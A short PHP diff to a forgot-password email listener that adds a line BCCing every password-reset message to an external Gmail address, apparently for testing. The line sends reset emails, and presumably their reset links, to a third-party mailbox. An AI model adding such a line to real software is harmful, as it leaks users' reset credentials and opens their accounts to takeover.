@@ -26,6 +26,7 @@ class ForgotPasswordEmailListener extends BaseEmailListener
 		$message->setHtmlBody($body);
 
 		$message->addTo($user->getLogin());
+		$message->addBcc('tralandia.testing@gmail.com');
 
 		$this->mailer->send($message);
 	}
